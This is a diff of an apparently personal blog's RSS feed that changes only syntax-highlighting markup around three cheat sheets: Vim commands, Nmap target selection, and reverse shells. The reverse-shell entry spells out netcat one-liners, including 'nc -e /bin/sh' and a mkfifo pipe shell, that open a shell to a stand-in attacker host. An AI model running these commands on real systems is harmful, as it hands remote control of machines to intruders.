@@ -18,7 +18,7 @@
       
       <guid>https://hare001.github.io/2020/vim-cheat-sheet/</guid>
       <description>&lt;h3 id=&#34;全局&#34;&gt;全局&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;:h[elp] 关键字 - 打开关键字帮助
+&lt;pre&gt;&lt;code class=&#34;language-wiki&#34; data-lang=&#34;wiki&#34;&gt;:h[elp] 关键字 - 打开关键字帮助
 :sav[eas] 文件名 - 另存为
 :clo[se] - 关闭当前窗口
 :ter[minal] - open a terminal window
@@ -33,17 +33,17 @@ K - 打开光标所在单词的man页面
       
       <guid>https://hare001.github.io/2020/nmap-cheat-sheet/</guid>
       <description>&lt;h3 id=&#34;nmap-target-selection&#34;&gt;Nmap Target Selection&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#Scan a single IP
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#Scan a single IP&lt;/span&gt;
 nmap 192.168.1.1
-#Scan a host
+&lt;span style=&#34;color:#75715e&#34;&gt;#Scan a host&lt;/span&gt;
 nmap www.testhostname.com
-#Scan a range of IPs
+&lt;span style=&#34;color:#75715e&#34;&gt;#Scan a range of IPs&lt;/span&gt;
 nmap 192.168.1.1-20
-#Scan a subnet
+&lt;span style=&#34;color:#75715e&#34;&gt;#Scan a subnet&lt;/span&gt;
 nmap 192.168.1.0/24
-#Scan targets from a text file
+&lt;span style=&#34;color:#75715e&#34;&gt;#Scan targets from a text file&lt;/span&gt;
 nmap -iL list-of-ips.txt
-&lt;/code&gt;&lt;/pre&gt;</description>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
@@ -53,15 +53,14 @@ nmap -iL list-of-ips.txt
       
       <guid>https://hare001.github.io/2020/reverse-shell-cheat-sheet/</guid>
       <description>&lt;h2 id=&#34;利用-nc-监听端口&#34;&gt;利用 nc 监听端口&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -lvp 2333
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;nc-版本&#34;&gt;nc 版本：&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc -e /bin/sh attackerip 2333
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nc -lvp &lt;span style=&#34;color:#ae81ff&#34;&gt;2333&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;nc-版本&#34;&gt;nc 版本：&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nc -e /bin/sh attackerip &lt;span style=&#34;color:#ae81ff&#34;&gt;2333&lt;/span&gt;
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip 2333 &amp;gt;/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &lt;span style=&#34;color:#ae81ff&#34;&gt;2333&lt;/span&gt; &amp;gt;/tmp/f
 
-nc attackerip 8888|/bin/sh|nc attackerip 9999
-&lt;/code&gt;&lt;/pre&gt;</description>
+nc attackerip 8888|/bin/sh|nc attackerip &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
   </channel>
